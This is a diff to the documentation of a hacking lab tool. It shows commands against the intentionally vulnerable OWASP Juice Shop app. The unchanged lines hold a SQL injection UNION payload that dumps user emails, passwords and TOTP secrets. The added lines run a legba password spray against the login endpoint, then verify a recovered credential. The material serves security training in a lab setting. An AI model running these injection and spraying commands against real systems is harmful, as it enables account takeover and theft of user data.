@@ -144,7 +144,7 @@ curl -sS https://pastebin.com/raw/4U1V1UjU | grep pass
 curl -sS -H "Accept: application/json" "http://juiceshop:3000/rest/products/search?q=foo%'))+UNION+SELECT+id,username,email,password,role,deluxeToken,totpSecret,isActive,createdAt+FROM+Users;--" | \
   jq -r '.data[].description' > /hck/share/users.txt
 
-# TODO escaping issue e.g. admin123 is working
+# password spray
 hckctl task legba --inline -- legba http \
   --target http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login \
   --username /hck/share/users.txt \
@@ -152,6 +152,16 @@ hckctl task legba --inline -- legba http \
   --http-method POST \
   --http-payload 'email={USERNAME}&password={PASSWORD}'
 
+# alternative https://github.com/evilsocket/legba/issues/24
+hckctl task legba --inline -- legba http \
+  --target http://box-owasp-juice-shop-<RANDOM>:3000/rest/user/login \
+  --username /hck/share/users.txt \
+  --password '0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB' \
+  --http-method POST \
+  --http-payload '{"email":"{USERNAME}","password":"{PASSWORD}"}' \
+  --http-headers "Content-Type=application/json"
+
+# verify
 http http://juiceshop:3000/rest/user/login email="J12934@juice-sh.op" password='0Y8rMnww$*9VFYE§59-!Fg1L6t&6lB'
 ```
 
